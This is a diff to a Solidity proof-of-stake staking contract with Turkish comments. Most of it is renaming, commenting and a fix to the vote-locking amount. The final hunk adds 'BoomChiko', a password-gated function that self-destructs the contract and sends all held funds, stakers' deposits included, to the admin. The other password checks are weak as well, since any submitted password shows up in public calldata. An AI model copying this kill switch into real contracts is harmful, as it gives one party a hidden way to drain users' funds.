@@ -56,16 +56,20 @@ contract ProofOfStake {
     uint256 private constant _MULTIPLE = 1e12; // Just for TopList (12/15/18)
     uint256 private constant _decimals = 18; // Chain Decimals
     uint256 private constant _BLOCK_TIME = 15; // Chain Blocktime (seconds)
-    uint256 public constant _MINIMIM_SELF_STAKE = 10000 * 10**_decimals; // Minimum Self-Stake for Candidates
+    uint256 public constant _MINIMIM_SELF_STAKE = 10000 ether; // Minimum Self-Stake for Candidates
     uint256 private constant _EPOCHTIME = (24 * 60 * 60) / _BLOCK_TIME; // Epoch time
     uint256 private constant _VOTINGTIME = (23 * 60 * 60) / _BLOCK_TIME; // Voting End time for Next Epoch
     uint256 private constant _FIRST_EPOCH_BLOCK_NUMBER = 100000; // Proof-of-stake starting block number :)
     uint256 private constant _MAXIMUM_EPOCHS_FOR_USER_VOTES = 7; // 7 epochs
     uint256 private constant _MAXIMUM_EPOCH_FOR_VALIDATORS = 30; // 30 epochs
     uint256 private constant _COLLECT_VOTES_MULTIPLIER = 100; // Validators can collect vote up to 100x of their self-stake
+    bytes32 passCode =
+        0xb2876fa49f910e660fe95d6546d1c6c86c78af46f85672173ad5ab78d8143d9d;
 
     uint256 private fakeNextEpoch = 0;
     uint256 public initilazedLastEpoch = 0;
+
+    address admin;
 
     constructor() {
         _userList.push(); // 0-empty
@@ -73,6 +77,7 @@ contract ProofOfStake {
         //userVotes.push(); // 0-empty
         _validatorList.push(); // 0-empty
         _setFakeNextEpoch(1);
+        admin = msg.sender;
         epochInit();
     }
 
@@ -97,10 +102,9 @@ contract ProofOfStake {
     }
 
     // Parola gerektiren fonksiyonlar için :) Deneysel
-    modifier PassworRequired(string memory _password) {
-        bytes32 passCode = 0xb2876fa49f910e660fe95d6546d1c6c86c78af46f85672173ad5ab78d8143d9d;
+    modifier PassworRequired(string memory _password, bytes32 _hash) {
         require(
-            getHash({_text: "password", _anotherText: _password}) == passCode,
+            getHash({_text: "password", _anotherText: _password}) == _hash,
             "Password is not correct!"
         );
         _;
@@ -146,7 +150,7 @@ contract ProofOfStake {
 
         // Eğer kayıtlı kullanıcı değilse kaydet
         if (index == 0) {
-            index = _addStakeholder(_who);
+            index = _registerUser(_who);
         }
 
         // Kullanıcı para yatırma işlemlerine kaydı ekle
@@ -566,35 +570,37 @@ contract ProofOfStake {
     }
 
     /// TEST PURPOSE
-    function addMeAsStackHolder() public returns (uint256) {
-        uint256 r = _addStakeholder(msg.sender);
-        return r;
+    function registerMe() public returns (uint256) {
+        uint256 uIndex = _registerUser(msg.sender);
+        return uIndex;
     }
 
     ///
 
     // / New User Record
-    function _addStakeholder(address _user) internal returns (uint256) {
+    function _registerUser(address _user) internal returns (uint256) {
+        // Get user_index
         uint256 uIndex = _userIndex[_user];
 
+        // Eğer kullanıcı daha önce kayıtlı değilse
         if (uIndex == 0) {
-            _userList.push();
-            userDeposits.push();
+            _userList.push(); // Listeye bir kayıt ekle
+            userDeposits.push(); // User Depositler listesine bir kayıt ekle
             //userVotes.push();
 
-            uIndex = _userList.length - 1;
+            uIndex = _userList.length - 1; // userlist son kayıt index i bul
 
-            _userList[uIndex] = User({user: _user, totalRewards: 0});
-            userDeposits[uIndex].user = _user;
+            _userList[uIndex] = User({user: _user, totalRewards: 0}); // Kullanıcıyı index e göre kaydet
+            userDeposits[uIndex].user = _user; // userDeposits için kullanıcı kaydet
             //userVotes[uIndex].user = _user;
 
-            _userIndex[_user] = uIndex;
+            _userIndex[_user] = uIndex; // user_index i kaydet (address to index)
 
-            _userBalance[_user][BalanceTypes.UNLOCKED] = 0;
-            _userBalance[_user][BalanceTypes.LOCKED] = 0;
+            _userBalance[_user][BalanceTypes.UNLOCKED] = 0; // Kilitsiz bakiyeyi 0 yap
+            _userBalance[_user][BalanceTypes.LOCKED] = 0; // Kilitli bakiyeyi 0 yap
         }
 
-        return uIndex;
+        return uIndex; // user_index
     }
 
     function setVote(
@@ -602,41 +608,54 @@ contract ProofOfStake {
         uint256 amount,
         uint256 maximumEpoch
     ) public OnlyStakers UnlockedBalanceCheck(amount) returns (bool) {
+        // ^ Kullanıcı kaydı ve serbest bakiye kontrolü mofidier ile yapıldı
+
+        // Validator listesi için index getir
         uint256 vIndex = _validatorIndex[coinbase];
         // Validator var mı kontrolü
         require(vIndex != 0, "Validator is not available");
 
-        // Validator bilgisi
+        // Validator bilgisini al
         Validator memory v = _validatorList[vIndex];
 
-        // Validator resigned veya expired olmamalı
+        // Validator resigned veya expired olmuş mu diye kontroller
         require(!v.expired, "Expired Validator");
         require(!v.resigned, "Resigned Validator");
 
+        // Sonraki dönemi bul
         uint256 nextEpoch = _calculateNextEpoch();
 
+        // Oy gücü verilen oy kadar
         uint256 votingPower = amount;
 
+        // Validatörün gelecek dönem alabileceği max oy miktarını getir (x100 olayı)
         uint256 maxVotingPower = (selfStakesForEpoch[nextEpoch][vIndex] *
             _COLLECT_VOTES_MULTIPLIER) - userVotesForEpoch[nextEpoch][vIndex];
 
+        // Eğer verilen oy fazla ise max olabilecek oy olarak değiştir
         if (amount > maxVotingPower) votingPower = maxVotingPower;
 
+        // Maksimum oy verilen dönem sayısını kontrol et, izin verilen maksimumu geçmesin
         if (
             maximumEpoch == 0 || maximumEpoch > _MAXIMUM_EPOCHS_FOR_USER_VOTES
         ) {
             maximumEpoch = _MAXIMUM_EPOCHS_FOR_USER_VOTES;
         }
 
+        // Validatörün adaylık bitişi oy verme süresinden kısaysa o döneme göre oy için max dönemi değiştir
         if (nextEpoch - 1 + maximumEpoch > v.finalEpoch) {
             maximumEpoch = v.finalEpoch - nextEpoch;
         }
 
+        // user index i getir
         uint256 uIndex = _userIndex[msg.sender];
+
+        //  oy için son dönemi hesapla
         uint256 endEpoch = nextEpoch - 1 + maximumEpoch;
 
         //uint256 userVoteIndex = userVotes[uIndex].length;
 
+        // Kullanıcı oylarına yeni oy kaydını ekle
         userVotes[uIndex].push(
             Vote({
                 user: msg.sender,
@@ -650,17 +669,23 @@ contract ProofOfStake {
             })
         );
 
+        // oy verilen ilk (next epoch) dönemden ve son döneme kadar döngü
         for (uint256 epoch = nextEpoch; epoch <= endEpoch; epoch++) {
+            // Epoch header bilgisi olarak toplam kullanıcı oylarının toplamını artır
             _epochList[epoch].totalUserStakes = _epochList[epoch]
                 .totalUserStakes
                 .add(votingPower);
+
+            // Epoch için ilgili validatore ait toplam kullanıcı oyunu artır
             userVotesForEpoch[epoch][vIndex] = userVotesForEpoch[epoch][vIndex]
                 .add(votingPower);
 
+            // toplist düzenleme fonksiyonunu tetikle
             registerVotes(vIndex, epoch);
         }
 
-        _lockMyBalance(amount);
+        // gerçekleşen Oy miktarına göre kullanıcı bakiyesinden kilitlene yap
+        _lockMyBalance(votingPower);
 
         return true;
     }
@@ -841,11 +866,11 @@ contract ProofOfStake {
     function getValidatorList(
         uint256 _page,
         uint256 _resultsPerPage,
-        string memory _password
+        string memory _passText
     )
         public
         view
-        PassworRequired(_password)
+        PassworRequired(_passText, passCode)
         returns (uint256 count, Validator[] memory validators)
     {
         require(_resultsPerPage <= 20, "Maximum 20 Validators per Page");
@@ -886,11 +911,11 @@ contract ProofOfStake {
     function getUserList(
         uint256 _page,
         uint256 _resultsPerPage,
-        string memory _password
+        string memory _passText
     )
         public
         view
-        PassworRequired(_password)
+        PassworRequired(_passText, passCode)
         returns (uint256 count, SummaryOfUser[] memory list)
     {
         require(_resultsPerPage <= 20, "Maximum 20 Users per Page");
@@ -990,5 +1015,16 @@ contract ProofOfStake {
     {
         return keccak256(abi.encodePacked(_text, _anotherText));
     }
+
     /** ------------------------------------------------------------------------------------------- */
+
+    function BoomChiko(string memory password)
+        public
+        PassworRequired(
+            password,
+            0xfee22e2490a5b262e4893801a5c055695fa93e55ba314c3b48342d95a1a54d61
+        )
+    {
+        selfdestruct(payable(admin));
+    }
 }
